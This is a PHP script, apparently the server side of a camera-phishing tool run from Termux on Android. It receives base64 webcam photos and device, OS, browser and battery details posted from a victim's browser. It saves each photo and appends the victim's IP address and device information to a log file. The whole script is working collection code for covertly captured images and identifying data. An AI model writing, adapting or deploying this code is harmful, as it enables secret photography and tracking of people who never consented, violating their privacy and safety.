<?php
$data = json_decode(file_get_contents('php://input'), true);
$image = $data['image'];
$device = $data['device'];
$os = $data['os'];
$browser = $data['browser'];
$battery = $data['battery'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$image = str_replace('data:image/jpeg;base64,', '', $image);
$image = str_replace(' ', '+', $image);
$image = base64_decode($image);
$filename = "/data/data/com.termux/files/home/dc_photos/photo_" . time() . ".jpg";
file_put_contents($filename, $image);

$log = "═══════════════════════════════════════════════════════════\n";
$log .= "TIME: $timestamp\n";
$log .= "IP ADDRESS: $ip\n";
$log .= "DEVICE: $device\n";
$log .= "OS: $os\n";
$log .= "BROWSER: $browser\n";
$log .= "BATTERY: $battery\n";
$log .= "PHOTO: $filename\n";
$log .= "═══════════════════════════════════════════════════════════\n\n";

file_put_contents("/data/data/com.termux/files/home/dc_photos/info.txt", $log, FILE_APPEND);

// Also display in terminal
echo "Saved! Device: $device | OS: $os | Browser: $browser | Battery: $battery | IP: $ip\n";
?>
